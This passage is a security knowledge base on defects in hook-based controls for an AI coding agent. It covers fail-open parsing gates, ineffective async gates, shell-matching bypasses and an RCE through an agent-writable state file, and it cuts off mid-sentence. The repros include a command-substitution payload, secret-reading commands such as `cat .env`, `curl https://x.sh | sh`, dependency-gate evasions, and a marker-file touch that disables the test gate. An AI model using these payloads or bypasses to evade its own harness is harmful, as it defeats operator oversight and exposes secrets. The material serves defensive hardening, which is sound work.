# Agentic coding-harness security — a knowledge base

**Built from the v2.5.0 → v2.6.0 delta of the Bootstrap Protocol.**
Compiled 2026-07-30, against tags `v2.5.0` (`fc04c10`) and `v2.6.0` (`f6bded0`).

**Amended 2026-07-31** against `main` `3355e9c` (in-version fixes, PRs #22 and
#23). That round found a **fourth** variant of P0-3 — one that v2.6.0 shipped and
that the test suite written to close P0-3b could not see — and it yields a sixth
cross-cutting pattern. Post-tag material is marked **`[+2026-07-31]`** so the
v2.5.0 → v2.6.0 delta this was compiled from stays legible as a delta.

**Amended again 2026-07-31**, from issue #29 (W-1) against 2.6.1: a **seventh**
pattern, §4.7 — two individually-correct features composing into a fail-open,
with no owner of the pair.

**Amended a third time 2026-07-31, revised 2026-08-03**, from issues #30–#33
against 2.6.1: an **eighth** (§4.8 — a normative instruction and its enforcement
contradicting each other, both halves green because each was tested only against
itself) and a **ninth** (§4.9 — relaxing a deny-list control is a security
change, *and sometimes cannot be done*: two over-refusal fixes were attempted
over four rounds, found 4 → 6 → 12 → ~20 blocking fail-opens, and were
**removed**, with the deny-direction hardening from those rounds kept).

**Amended a fourth time 2026-08-04**, from four `dependency-gate` install
bypasses fixed after the `v2.7.0` tag (issues **#36, #40, #39, #41**): a
**tenth** pattern, §4.10 — a control can reach the *right verdict for the wrong
reason*, and the release-diff check this document itself recommends is blind to
it, because it compares verdicts rather than reasons. That check is the
strongest control here and it recorded the defect as *unchanged*; the amendment
strengthens §7 rather than retiring it.

§4.10 then grew three corollaries the same week, and their provenance is the
point: **each came from a defect in the fix for the one before it.** The fix for
§4.10 shipped a deny → allow regression under a truthful "no regressions" record
(corollary 1 — that set is a claim about the corpus); its replacement made the
matcher cubic, so the control failed by not answering (corollary 2 — cost is a
security parameter, and the timeout table is part of the control); and the
optimisation that fixed *that* was documented as harmless by an argument that
covered only half its failure mode — and the equivalence test written to
replace the argument then passed over the *next* fail-open (corollary 3 —
assert the property, not equality against a corpus, and mutation-test the
constant). Three rounds, each caught by an adversarial pass
and none by a green suite. Post-tag material is marked **`[+2026-08-04]`**.

All five post-tag patterns are new **classes**, not new members of the delta;
the delta's own counts (fourteen defects, four fail-open, one RCE) are unchanged
and describe v2.5.0 → v2.6.0 only. So §4 now carries **eleven** patterns: five
compiled from the delta, six added post-tag.

This document exists because a harness that configures an AI coding agent is a
**security product**, and this project shipped one whose gates did not gate. The
v2.5.0 → v2.6.0 delta closed fourteen defects, four of them fail-open security
holes and one a confirmed RCE. This is the catalogue, the mechanisms, the repros,
and — the part worth keeping — the **generalizable failure classes**, which are
not specific to this project, this language, or this agent runtime.

---

## 0. How to read this, and what to trust

Every claim below is labelled:

| label | meaning |
|---|---|
| **EXECUTED** | Reproduced in this session against both tags. The command and its exit codes are shown. |
| **CITED** | From `docs/bootstrap-protocol-upstream-bugs-2026-07-28.md`, confirmed by that review's author but not re-run here. |
| **STATIC** | Established by reading code, not by running it. |

The distinction is load-bearing. **Static review of these same files found neither
the RCE nor the dead gates.** A finding that has not been executed has not been
found — it has been guessed at, correctly or otherwise. That is the first lesson,
and it is why the labels are on every row.

### Reproduction environment

```bash
# The v2.5.0 control — install with the OLD installer, from the tag
mkdir -p /tmp/kb && cd /tmp/kb
git -C <repo> archive v2.5.0 | tar -x -C old250
cat > cfg.yaml <<'EOF'
project: {name: demo, archetype: fullstack}
principles: {tdd_policy: required}
commands: {test: "true", lint: "true", ci: "true"}
secrets:
  enabled: true
  never_read_paths: [".env*", "secrets/**", "*.pem"]
EOF
mkdir v25 v26
python3 old250/bin/bootstrap-install -c $PWD/cfg.yaml -C v25    # the vulnerable tree
python3 <repo>/bin/bootstrap-install -c $PWD/cfg.yaml -C v26    # the fixed tree

# Drive a hook directly. THIS is the whole technique.
printf '{"tool_name":"Bash","tool_input":{"command":"cat .env"}}' \
  | CLAUDE_PROJECT_DIR=$PWD/v25 bash v25/.claude/hooks/secrets-gate.sh; echo "rc=$?"
```

Four harness notes that cost real time here, recorded so they cost you none:

1. **Capture `$?` immediately.** `printf '%s rc=%s' "$(some_cmd)" "$?"` reads the
   exit code of the *command substitution*, not of the thing you ran. This
   produced two wrong readings mid-investigation before it was caught.
2. **Build a fixture whose `commands.test/lint/ci` are `false`.** On a fixture
   where the test command passes, a gate that correctly *matched* still exits 0
   and looks inert. You cannot tell "did not match" from "matched and allowed"
   without it.
3. **To execute `sdk_gates/gates.py` without the SDK installed,** stub it on
   `PYTHONPATH`: a `HookMatcher` class plus a module-level `__getattr__`
   returning throwaway types is enough to reach the matching internals.
4. **Build substrates where a dependency is PRESENT AND BROKEN, not merely
   absent.** `[+2026-07-31]` Removing `jq` from a symlink farm tests one
   thing; a `jq` that exists, is executable, and exits 127 tests a different
   one, and the second is the case that shipped (P0-3d below). Three shapes,
   all real, all satisfying `command -v`:

   ```bash
   # (i) version-manager shim with no version resolved — asdf/mise both carry
   #     jq as a first-class tool (`asdf-jq`; mise registry `aqua:jqlang/jq`),
   #     and put their shim dir on PATH. Verified 2026-07-31.
   printf '#!/bin/sh\necho "mise: jq is not installed" >&2\nexit 127\n' > farm/jq
   # (ii) broken dynamic link — the Alpine/slim-image shape
   printf '#!/bin/sh\necho "jq: error while loading shared libraries: libonig.so.5" >&2\nexit 127\n' > farm/jq
   # (iii) right name, not executable
   : > farm/jq && chmod 644 farm/jq        # `command -v` still says yes
   ```

   Build the farm with symlinks, then **`rm` the link before writing the
   stub** — `cat > farm/jq` follows the symlink and writes through to the real
   `/usr/bin/jq`. (It failed with `Permission denied` here, which is the only
   reason it was caught.)

---

## 1. The threat model that makes this different

A conventional application's threat model asks *what can an outsider reach*. An
agentic coding harness has a different shape, and three properties drive
everything in this document:

**(A) The adversary is inside, and is expected to be.** The agent writes files,
runs commands, and edits configuration as its *normal function*. There is no
perimeter to breach. Every control is an inner-loop control, and every input the
agent can influence — file contents, command strings, tool payloads — is
attacker-controlled input in the formal sense, whether or not the agent is
adversarial today. Prompt injection from a fetched page, a poisoned dependency's
README, or a malicious issue comment all convert "the agent" into "an attacker"
without changing anything about the harness.

**(B) The controls are shell scripts invoked by a runtime whose semantics decide
whether they matter at all.** A hook's exit code is only meaningful if the runtime
is listening. `async: true` makes exit codes advisory. Exit 1 means "hook error,
tool proceeds". These are *runtime* facts that silently invert the meaning of
correct-looking code — a hook can be perfectly written and completely inert.

**(C) The failure mode is silence.** A gate that crashes loudly gets fixed in an
hour. A gate that returns 0 because its JSON parser was missing looks exactly like
a gate that ran and approved. **Seven of the fourteen defects below were silent
allows** — P0-2, P0-3a, P0-3b, P0-3c, P1-1, P1-3 and P2-5. The 1016-check test
suite was green over all fourteen.

**The composite risk:** the harness tells the operator "your secrets are gated,
your tests must pass, your dependencies are reviewed." If any of that is false,
the operator has *less* safety than with no harness at all, because they have
stopped checking manually. **Disclosure accuracy is therefore a security property,
not documentation hygiene** — a theme this document returns to repeatedly.

---

## 2. The delta at a glance

**How this is counted, stated once so it cannot drift. `[+2026-07-31]`** The
delta is **fourteen** defects — the rows below, with **P0-3a/b/c counted
separately**, which is the basis §4.2's own enumeration already uses and the
basis on which "four of them fail-open" (P0-3a, P0-3b, P0-3c, P2-5) is correct.
**P0-3d is post-tag and sits outside the fourteen**: v2.6.0 ships it, so the
delta did not close it. This document said "thirteen" in six places from the day
it was written, against a table that has never had thirteen rows; corrected here.

| ID | Defect | Class | v2.5.0 | v2.6.0 |
|---|---|---|---|---|
| P0-1 | Arithmetic command substitution in drift counter | **RCE** | exploitable | fixed |
| P0-2 | `secrets-gate` not wired to `Bash` | control bypass | bypassable | fixed |
| P0-3a | jq-less payload >128 KiB fails `exec` | fail-open | allows | fixed |
| P0-3b | Neither `jq` nor `python3` → `case` falls through | fail-open | allows | fixed |
| P0-3c | `set -e` death → exit 1 = "tool proceeds" | fail-open | allows | fixed |
| P0-3d | Parser **present but broken** → selector never falls back | fail-open | allows | **allows** — fixed post-tag `[+2026-07-31]` |
| P1-1 | `async: true` makes `exit 2` a no-op | dead control | 3 gates inert | fixed |
| P1-2 | `spec-gate-commit` blocks every first commit | availability | blocks all 60 files | partly fixed |
| P1-3 | `dependency-gate` fail-open + fires on prose | control bypass | 11 bypasses | mostly fixed |
| P1-4 | Substring command matching | bypass + false positive | bypassable | fixed |
| P2-4 | Secrets path over/under-matching | both | over-blocks | partly fixed |
| P2-5 | Relative path + exit 127 misreported | fail-open + misreport | allows/misreports | fixed |
| P2-6 | `format-lint-gate` runs a *mutating* formatter | integrity | mutates tree | fixed |
| P2-7 | Drift counter keyed on a non-existent env var | dead control | permanently saturated | fixed |
| P2-8 | `spec-gate-entry` guarded by an always-false test | dead control | never fires | fixed |

---

## 3. The catalogue

### P0-1 — Arbitrary command execution via an agent-writable state file

**Class:** untrusted input reaching an evaluation context. **EXECUTED.**

The drift detector counted tool calls:

```bash
n=$(( $(cat "$ST" 2>/dev/null || echo 0) + 1 ))     # v2.5.0
```

`$ST` is `.claude/sessions/.drift-state-<sid>` — gitignored, and writable by any
ordinary `Write` tool call. **Bash performs command substitution inside arithmetic
evaluation, including within array subscripts.** So the file's *contents* are
executed.

```bash
$ printf 'PATH[$(touch /tmp/PWNED_250)]\n' > v25/.claude/sessions/.drift-state-default
$ printf '{"session_id":"s","tool_name":"Write","tool_input":{"file_path":"/x/a.py"}}' \
    | CLAUDE_PROJECT_DIR=$PWD/v25 bash v25/.claude/hooks/drift-detector.sh
$ ls /tmp/PWNED_250
/tmp/PWNED_250                       # v2.5.0: RCE CONFIRMED
```

The same payload against v2.6.0 leaves no file; the state normalises to `1`.
Mechanism verified independently of the harness:

```bash
$ echo 'PATH[$(touch /tmp/PWNED_MECH)]' > /tmp/st.txt
$ bash -c 'n=$(( $(cat /tmp/st.txt) + 1 ))'
bash: ... arithmetic syntax error                    # bash errors AFTER running touch
$ ls /tmp/PWNED_MECH                                 # the file exists
```

Note the payload shape: `a[$(...)]` alone is stopped by `set -u`; **any
already-set variable name** such as `PATH` works. And the arithmetic still *errors*
afterwards — the shell reports a syntax failure, which is exactly the kind of noise
an operator dismisses, having already executed the payload.

**Why this one matters more than its three-line fix suggests.** It is a clean path
from "the agent writes a file" — an operation *no gate blocks, by design, because
writing files is the agent's job* — to "arbitrary command executes", bypassing
every `PreToolUse` `Bash` gate in the suite. The harness's entire threat model
assumes command execution is gated. One `$(( ))` over one gitignored file voided
that assumption.

**Fix (v2.6.0):** read, validate as unsigned integer, then compute.

```bash
n=$(cat "$ST" 2>/dev/null || echo 0)
case "$n" in ''|*[!0-9]*) n=0 ;; esac
n=$((n + 1))
```

> **Generalizes to:** *any* state a privileged component reads back from a location
> the unprivileged component can write. Arithmetic is the bash-specific instance;
> the class is **deserialization of agent-writable state**. Audit for `$(( ))`,
> `eval`, `source`, `printf %b`, `declare`, unquoted expansion into `[ ]`, and in
> other languages `pickle.load`, `yaml.load`, `Function()`, `JSON.parse` feeding a
> template. **Fix the class, not the instance** — the upstream report said so
> explicitly, which is why the v2.6.0 checklist item is phrased as a class-wide
> prohibition and why every remaining `$(( ))` in the emitted tree was audited to
> internal counters only.

---

### P0-2 — The gate was wired to the tools nobody uses to read a file

**Class:** incomplete tool-surface enumeration. **EXECUTED.**

```
                secrets-gate matchers
v2.5.0    [('PreToolUse', 'Read|Write|Edit')]
v2.6.0    [('PreToolUse', 'Bash'),
           ('PreToolUse', 'Read|Write|Edit|NotebookEdit|Grep|Glob')]
```

`Bash` was not on the list. Every never-read path was therefore readable:

```
                          v2.5.0   v2.6.0
cat .env                    0        2
base64 secrets/prod.yaml    -        2
git diff -- *.pem           -        2
cp .env /tmp/x              -        2
less .env                   -        2
xxd key.pem                 -        2
```

Two independent failures compound here. The gate was not *registered* on `Bash`,
**and** the hook body read only `.tool_input.file_path`, so even when handed a
`Bash` payload directly it returned 0 — it had no concept of a command string.
Fixing the registration alone would have produced a gate that ran on every `Bash`
call and approved all of them: a control that costs latency and provides nothing.

`NotebookEdit` was a subtler version of the same bug: it *was* matched by the
`Read|Write|Edit` substring, but supplies `notebook_path`, which the hook never
read — **exit 0, logged "no path", a gate reporting success while checking
nothing.** v2.6.0 blocks it (`rc=2`).

> **Generalizes to:** enumerate the *capability*, not the tool you thought of. The
> question is never "did I gate `Read`" but **"what is the complete set of ways
> this runtime can cause bytes from path P to reach the model?"** For a coding
> agent that set includes at minimum: file-read tools, notebook tools, search tools
> (`Grep`/`Glob` leak *existence and matching lines*), shell, and any fetch tool
> that accepts `file://`. Then ask the same question for each tool's *parameter
> name* — a gate that reads `file_path` is blind to `notebook_path`, `path`,
> `pattern`, `command`, and `url`. **Write the enumeration down and test each
> element**; this is exactly what `tests/test_hook_behavior.py`'s payload matrix
> now does.

---

### P0-3 — Four ways a parsing gate silently allowed

**Class:** unenumerated degraded paths in a security control. All **EXECUTED**.

Every gate parses its JSON payload through a shared `jget` helper. Four separate
conditions made that helper return empty, and an empty parse fell through the
gate's `case` statement to allow. **(a)–(c) were closed by v2.6.0; (d) was found
a day after the tag, and v2.6.0 ships it.**

**(a) Payload larger than 128 KiB, with `jq` absent.** The fallback passed the
entire payload to Python *in an environment variable*. Linux caps a single
environment variable at `MAX_ARG_STRLEN` = 32 pages = 131072 bytes = 128 KiB.
Beyond it `exec` fails with `E2BIG`, and `|| true` swallowed the failure.

```
jq REMOVED, python3 present — Write to .env, which MUST block:
          v2.5.0                    v2.6.0
  1000      rc=2                      rc=2
  100000    rc=2                      rc=2
  200000    rc=0  <-- ALLOWED         rc=2
  3000000   rc=0  <-- ALLOWED         rc=2

control, same 3 MB payload WITH jq present:
  v2.5.0    rc=2      <-- proving the env-var path is the sole cause
```

The boundary is visible in the data: 100 KB blocks, 200 KB allows. **A large
`Write` to `.env` is precisely the case that matters** — the payload is big
*because* it contains the secret.

There is a lesson inside the lesson. The header comment credited env-passing as the
fix for an *earlier* bug where the fallback re-read already-consumed stdin. It
traded one silent failure for another. v2.6.0 pipes the payload to the fallback's
own stdin: fresh stdin, no size ceiling, both bugs closed. **When a fix moves data
from one channel to another, enumerate the new channel's limits** — every channel
has them, and the ones you don't check are the ones that bite.

**(b) Neither `jq` nor `python3` on `PATH`.** Both branches ended in `|| true`.

```
env -i PATH=<no jq, no python3>          v2.5.0        v2.6.0
secrets-gate      cat .env                 allow      rc=2 BLOCKED (fail-closed)
spec-gate-commit  git commit               allow      rc=2
test-gate         git commit               allow      rc=2
dependency-gate   npm install evil         allow      rc=2
ci-mirror         git push                 allow      rc=2
tdd-gate          Write src/a.py           allow      rc=2
```

v2.6.0 denies on all six, with `BLOCKED (fail-closed): no JSON parser available
(need jq or python3)`. **Advisory hooks are handled separately and correctly** —
the six that exist to inform rather than block declare `FAIL_CLOSED=0` and degrade
to a logged no-op (`rc=1`, `hook degraded: …`). That asymmetry is the design, and
it is worth stating precisely because getting it wrong in the other direction is
also a defect: an earlier iteration put the fail-closed check *above* the line that
lowered the posture, so six advisory hooks exited 2 on an empty payload — and on a
`Stop` event `exit 2` means "do not stop", while on a `UserPromptSubmit` hook it
**blocks the operator's own prompt.**

**(c) Environment failure → exit 1 → "tool proceeds".** `mkdir -p` of the log
directory died under `set -e`.

```
CLAUDE_PROJECT_DIR unwritable, Read of .env:
  v2.5.0  rc=1   mkdir: cannot create directory ... Permission denied
                 ^ exit 1 = "hook error, tool proceeds" — the read went through
  v2.6.0  rc=2   BLOCKED: .env matches never-read pattern .env*
```

**(d) A parser that is present and does not work.** `[+2026-07-31]` **v2.6.0
ships this one.** (a)–(c) are about the parse; (d) is about the **selector**.

```bash
have_jq(){ command -v jq >/dev/null 2>&1; }      # a PRESENCE test
jget(){
  if have_jq;   then ... jq      ... 2>/dev/null || true
  elif have_py; then ... python3 ... 2>/dev/null || true
  else hook_fail "no JSON parser available"; fi
}
```

`command -v jq` answers *"is there a file named jq on PATH"*, which is not the
question any caller has. It reports success for all three shapes in note 4 above.
jq then ran, failed, `|| true` erased the failure, `jget` returned empty, and the
`case` fell through to allow. The `elif` is the second half of the defect: the
fallback is bound to jq's **absence**, never to its **failure**, so a healthy
`python3` on the same PATH was structurally unreachable.

```
jq PRESENT but exiting 127 (broken libonig / mise shim), python3 healthy:
                                     v2.6.0 (f6bded0)      main (3355e9c)
  secrets-gate     cat .env            rc=0  ALLOWED         rc=2 BLOCKED
  dependency-gate  npm install evil    rc=0  ALLOWED         rc=2 BLOCKED

control — same substrate, jq ABSENT rather than broken:
  secrets-gate     cat .env            rc=2                  rc=2
```

The control line is the point: **P0-3b's fix works perfectly.** The fallback is
correct; it was simply never reached. A defect can sit entirely in the predicate
that chooses between two correct implementations.

Both fail-opens were silent — no stderr, and `hooks.log` recorded only a
misleading `secrets-gate: no path`. The fix tries each parser in turn and accepts
its output only if it **exited clean**; both unusable is now the same condition as
neither installed. The parser is the *last* command in the pipeline, so its status
is already the pipeline's — that is plain POSIX and needs no option. What the
header's `set -o pipefail` adds is the reverse direction: a failed `printf`
(SIGPIPE, if the parser dies before reading) also fails the pipeline, so a
half-fed parse cannot be mistaken for a clean one. `[+2026-07-31]`

**Why the suite could not see it, which is the part to keep.**
`tests/test_hook_behavior.py` covers the whole executing-suite gap — P0-1, P0-2,
P0-3a/b/c, P1-1, P1-3, P1-4, P2-4 through P2-8 — but its *parser* substrates were
built specifically for P0-3b. They are symlink farms for *jq absent* and for
*no parser*, under this comment:

> *"A symlink farm is the only honest way — `command -v jq` cannot be fooled by
> shadowing."*

That sentence is **true, and it is the wrong invariant.** Nothing was shadowing
jq. It was broken, and a presence test reports broken as success. The suite built
to prove the degradation path encoded the author's model of *how* the dependency
could be missing, and that model had one entry. **A test suite inherits the
imagination of the fix it was written for** — which is the §5 lesson about tests
written from the implementation, one level up: not "written from the code" but
"written from the *theory of failure*."

> **Generalizes to:** see §4.6. A capability check must exercise the capability.

> **Generalizes to:** **enumerate every path by which your control can fail to
> reach a decision, and make each one deny.** Missing dependency, oversized input,
> unwritable filesystem, timeout, malformed payload, permission error. The generic
> forms: (i) a `case` with no `*)` deny arm; (ii) `|| true` on anything whose
> failure is security-relevant; (iii) incidental work (logging, temp files) that
> can kill the process before the decision; (iv) any error path that exits with a
> code the runtime reads as "proceed". v2.6.0's structural answer is a single
> `hook_fail` exit path plus `trap 'hook_fail …' ERR`, so an *unanticipated* error
> routes to deny rather than to whatever `set -e` happens to produce. **That
> trap is the important part: it converts the open set of unknown failures into a
> closed decision.**

---

### P1-1 — `async: true` makes `exit 2` a no-op

**Class:** runtime semantics inverting correct code. **EXECUTED** (wiring).

```
v2.5.0 settings.json:
  PreToolUse  Bash        test-gate.sh        async=True
  PreToolUse  Bash        ci-mirror.sh        async=True
  PostToolUse Write|Edit  format-lint-gate.sh async=True

v2.6.0: zero async keys; timeouts secrets-gate=60 test-gate=600
        ci-mirror=900 format-lint-gate=120
```

**An async hook's exit code cannot reject a tool call, and its stderr is
suppressed.** So `test-gate.sh` computed the right answer, printed *"Commit
blocked: tests failing"* to a stream nobody read, exited 2 into a runtime that
ignored it — and the commit went through. Three of the harness's gates did not
exist. The per-task lifecycle presents "implementation passes local gates" as gate
5 of 6; for those hooks that gate was fictional.

**The normative document was wrong in the same direction as the code.** v2.5.0's
own §6.C recommended `async: true` for the CI mirror — a gate whose entire purpose
is to exit 2 on failure. The specification and the implementation agreed, and both
were wrong, which is precisely why review that checks implementation-against-spec
could not find this.

That the fix was *ordered* matters too. The upstream report insisted P1-3 and P1-4
be fixed **before** P1-1: making these gates synchronous while they still
substring-matched would have converted a silent no-op into a multi-minute build on
innocuous commands — "the archetypal *operator disables the gate* trainer."

> **Generalizes to:** **know your runtime's control semantics before writing
> controls, and encode them where they cannot be forgotten.** For Claude Code hooks
> the three facts are: exit 2 blocks; any other non-zero is "hook error, tool
> proceeds"; async severs the exit code entirely. **A fourth belongs beside them
> and is the one an adversary schedules** `[+2026-08-13]`: exceeding the hook's
> declared `timeout` cancels it, and a cancelled process never exits 2 — so the
> deny never arrives. The first three are properties of code you wrote; this one
> is a property of the *input*, and cost is a function of what the agent supplies.
> Every harness has an equivalent set. Then: **assert them.** A test that pipes a must-deny payload into the
> deployed configuration and asserts the tool was actually rejected would have
> caught this; no amount of reading the hook body ever would.
>
> The second-order lesson is about **fix sequencing under a false-positive budget**.
> Turning on enforcement that was previously inert is only safe once precision is
> good enough that the operator will tolerate it. Enforcement and precision ship
> together or the control gets disabled — and a disabled control is worth less than
> an inert one, because disabling it is a decision the operator now believes they
> have made safely.

---

### P1-2 — The gate that blocked every possible first commit

**Class:** availability failure that trains the operator to bypass. **EXECUTED.**

A fresh `git init`, the emitted harness plus two source files staged, 60 files
total, and the first commit attempted:

```
v2.5.0  rc=2
  Commit blocked: files not referenced by any active spec:
  .claude/.gitignore .claude/agents/implementer.md ... .claude/specs/INDEX.md
  ... CLAUDE.md gleam.toml src/engine.gleam
  [all 60 files, including the gate's own script and its own spec index]

v2.6.0  rc=2
  Commit blocked: files not referenced by any active spec: src/engine.gleam
```

v2.5.0 blocked **the entire bootstrap commit**, including `.claude/specs/INDEX.md`
— the file the gate consults to decide. Harness files can never be referenced by a
spec; they *are* the spec infrastructure. Every adopting project hit this on its
very first commit, before writing a line of code.

Two implementation bugs compounded it (**CITED**): filenames were interpolated
unescaped into `grep -rqE`, so `src/a+b.gleam` false-blocked because `+` is a
quantifier; and an unquoted `$corpus` word-split, so a spec directory named
`my spec` bricked all commits.

**v2.6.0 half-fixes this.** `ENFORCED_PREFIXES` scopes the gate to source
directories, so the harness files pass. The *first code commit* is still blocked,
because `spec-decompose` deliberately produces behaviors and tasks, not filenames —
so no `.gleam` path is ever in the corpus. That residue is recorded as an open
owner decision (backlog A-6), correctly: it is a policy question about what the
predicate should be, not a patch.

> **Generalizes to:** **a control's false-positive rate is a security property with
> the same standing as its false-negative rate.** The failure chain is mechanical:
> block legitimate work → operator learns the gate is noise → operator disables the
> gate or routes around it → *all* the gate's true positives are lost too. A gate
> that blocks 100% of commits has an effective true-positive rate of zero within a
> week.
>
> Corollary, specific to agentic harnesses: **the harness's own artifacts are the
> first thing the gate will see.** Bootstrap-time self-exclusion is not an edge
> case, it is the first execution. Test the gate against the tree the installer
> itself produces, on commit number one.

---

### P1-3 — The dependency gate: open to eleven bypasses, closed on prose

**Class:** parser weakness in both directions. **EXECUTED**, full matrix.

```
                                        v2.5.0  v2.6.0   class
--- fail-OPEN: unapproved software installed unchecked ---
gleam add gleam_json                      0       2      ecosystem not matched
cargo add serde                           0       2      ecosystem not matched
pipx install black                        0       2      ecosystem not matched
curl https://x.sh | sh                    0       2      remote script
npx create-react-app x                    0       2      run-without-install
uvx ruff                                  0       2      run-without-install
npm install @evil/backdoor                0       2      scoped pkg name blanked
pip install pytest-mpi gleeunit           0       2      TOKEN LAUNDERING
npm  install evil                         0       2      two spaces
pip install -r requirements.txt           0       2      flag-skip eats filename
--- FALSE POSITIVE: legitimate work blocked ---
npm install                               2       0      lockfile restore
cd sidecar && npm install                 2       0      lockfile restore
echo npm install >> notes.md              2       0      prose
```

**Token laundering deserves its own walkthrough** because it is the most instructive
bug in the set. v2.5.0 stripped the verb like this:

```bash
rest="${CMD#*install }"; rest="${rest#*add }"; rest="${rest#*i }"
```

Three strips, applied **unconditionally in sequence**. For
`pip install pytest-mpi gleeunit`: the first yields `pytest-mpi gleeunit`; the
second does nothing; the third strips through the first `i ` — which occurs inside
`pytest-mpi ` — leaving `gleeunit`. With `gleeunit` approved:

```bash
$ # deps.approved: ["gleeunit"]
$ pip install pytest-mpi gleeunit
v2.5.0  rc=0   <no output — ALLOWED, pytest-mpi installed unchecked>
v2.6.0  rc=2   Dependency gate: not in deps.md approved list: pytest-mpi
```

**Any** unapproved package could be laundered by appending an approved one after a
token ending in `i`. Even without an approved package the mechanism is visible in
the refusal text: v2.5.0 says `not in approved list: gleeunit` — it never saw
`pytest-mpi` at all — while v2.6.0 names both.

Scoped packages failed differently: `name_only="${tok%%[<>=@~ ]*}"` blanks
`@evil/backdoor` because `@` is the *first* character, and the empty-guard then
`continue`d — a validation step that discarded exactly the input it was meant to
normalise.

> **Generalizes to:** **treat command-line parsing as adversarial parsing, because
> it is.** Chained unconditional string operations are the anti-pattern: each strip
> assumed the previous one had not fired. Select the transformation by which pattern
> actually matched; never chain. Normalise *then* tokenise *then* validate, and make
> "I could not parse this" a deny rather than a skip.
>
> Also: **an allowlist over package *names* answers only "is this name approved".**
> It cannot answer "where is this coming from" (`--index-url`, `NPM_CONFIG_REGISTRY`),
> "what else comes with it" (`-r requirements.txt`), or "is it being installed at
> all" (`npx`, `uvx`, `pnpm dlx`, `pipx run` fetch and **execute** without
> installing — not installing first is not a mitigation). v2.6.0 gates all of these
> and documents them as distinct refusal classes, which is the right shape: name
> your control's blind spots *in the refusal message*, where the operator hits them.

---

### P1-4 — Substring matching, and the invoker rule

**Class:** command-position parsing. **EXECUTED.**

v2.5.0 matched a fixed-spacing literal substring, which failed in both directions
simultaneously. Driven through `test-gate` on both tags, with `commands.test:
"false"` so that a match is observable (2 = gate fired, 0 = missed):

| command | v2.5.0 | v2.6.0 |
|---|---|---|
| `git commit -m x` | 2 | 2 |
| `git  commit -m x` (two spaces) | **0** | 2 |
| `git<TAB>commit -m x` | **0** | 2 |
| `git --no-pager commit -m x` | **0** | 2 |
| `git -C /repo commit -m x` | **0** | 2 |
| `echo "git commit is the verb"` | **2** | 0 |
| `grep -r "git commit" .` | **2** | 0 |
| `ls # git commit` | **2** | 0 |
| `sh -c "git commit"` | 2 | 2 |
| `git add -A` ⏎ `git commit -m wip` | 2 | 2 |

The false-positive half was the dangerous one operationally: `git commit` appearing
in a comment, a quoted string, or a grep pattern triggered a full build. The
upstream review notes this **blocked the reviewing agent's own tool call
mid-review**, and the review had to be rewritten with concatenated verbs to
proceed.

**The last two rows are the most instructive in this document, so read them
carefully.** Substring matching caught `sh -c "git commit"` and the multi-line
case *for free* — a dumb filter has no blind spot a smarter parser doesn't have to
re-earn. Anchoring to command position fixed all five bypasses above and
**introduced two new ones**: a verb inside an invoker's quoted argument no longer
matched, and an intermediate fix that normalised whitespace with
`tr -s '[:space:]' ' '` turned newlines into spaces while the segment-anchor class
was `[;&|(]` — which does not contain a space — so **any verb on a second line
became unreachable** on `spec-gate-commit`, `test-gate` and `ci-mirror`. Multi-line
is the *normal* shape of an agent's `Bash` call, not an exotic one. Both
regressions were found and closed in later rounds; neither existed at v2.5.0.

> This is the recurrence pattern of §5.1 caught in a single table: **the fix for a
> matching bug is itself a matching bug until proven otherwise.** When you replace a
> permissive matcher with a precise one, the old matcher's accidental coverage is
> your regression suite — enumerate what it caught and assert the new one still
> does.

**The invoker rule is the part worth internalising.** Anchoring the verb to command
position fixes the false positives but opens a new hole: `sh -c "git commit"` no
longer matches, because the segment starts with `sh`. The upstream report proposed
*accepting* that loss. The correct answer — and what both substrates now do — is
that **an invoker's quoted argument is a command line, not data**, so it opens a
fresh command position and must be re-segmented and re-tested:

```
                                          v2.6.0 shell   v2.6.0 SDK
sh -c "git commit"                            2            True
sh -c 'git commit'                            2             -
bash -c "sh -c \"git commit\""                2            True    (depth 3)
ssh host "git commit"                         2             -
sh -c "git status"                            0             -      (discriminating)
echo "git commit"                             0            False   (not substring)
```

Two implementation details that a reimplementation will get wrong:

- **Backslash escapes must be neutralised before the quote walk.** Otherwise
  `bash -c "sh -c \"pip install evil\""` desyncs the scanner and the inner level is
  silently lost. An earlier fix attempt added recursion *over mis-parsed input*,
  which is worse than no recursion.
- **An unquoted newline is a command separator; a newline inside a quoted run is
  not.** Normalising whitespace by translating `\n` to a space made every verb on a
  second line unreachable — and multi-line is the *normal* shape of an agent's
  `Bash` call, not an exotic one.

> **Generalizes to:** if your control matches on a command string, you are writing a
> shell parser, and you should know that you are. The minimum correct set:
> normalise whitespace *within* lines while preserving line structure; segment on
> `; & | ( )`, backticks, and unquoted newlines; be quote-aware so a `;` inside an
> argument does not tear a segment; neutralise escapes first; anchor the verb at
> segment start; and **re-enter on invoker arguments to a stated depth**. Anything
> less is a filter, not a gate.
>
> **Structural alternative worth preferring where available:** match on the
> runtime's *structured* tool parameters rather than on a reconstructed command
> string, or move enforcement to a layer that sees the syscall rather than the
> intent. String matching over a Turing-complete shell language is a losing game
> played well.

---

### P2-4, P2-5, P2-6, P2-7, P2-8 — the correctness tier

**P2-4 — path pattern over- and under-matching. EXECUTED.**

```
config never_read_paths = [.env*, secrets/**, *.pem]
                              v2.5.0  v2.6.0
src/my.envelope.gleam           2       0     over-match FIXED
docs/dev.environment.md         2       0     over-match FIXED
docs/no-secrets/plan.md         2       0     over-match FIXED
.env / config.env / *.pem       2       2     still correctly blocked
NotebookEdit notebook_path      0       2     blind spot FIXED
```

Patterns had an implicit leading `*`, so `.env*` behaved as `*.env*`. Deny-list
over-match is the right *bias*, but a hard block mid-plan with no override path is
what gets the gate deleted — the P1-2 lesson in a different costume. v2.6.0 matches
dot-segment aware: `config.env` and `prod.env` still block, word-interior matches do
not.

**P2-5 — relative path and a false cause. EXECUTED** (the 127 half).

`find src -type f -newer "$MARK"` used a **relative** path against an absolute
marker, so in a project without `src/` the find failed silently and — once the
marker existed — **every commit passed with no test run, forever.** v2.6.0 removes
the marker mechanism entirely (see P2-7's sibling lesson below) and distinguishes a
missing toolchain from a real failure:

```
commands.test = "definitely-not-a-real-binary"
v2.5.0  rc=2  Commit blocked: tests failing.
v2.6.0  rc=2  Install the toolchain or fix commands.test in bootstrap.config.yaml.
```

Both block — but v2.5.0 told the operator their tests were failing when the tests
had never run. **A control that misreports its reason trains the operator to
distrust it**, which lands back at P1-2.

**The marker file is the sharper lesson.** `test-gate` skipped the run when
`.claude/.last-test-pass` was newer than the sources. That file is gitignored,
agent-writable, and guarded by nothing: `touch .claude/.last-test-pass` disabled the
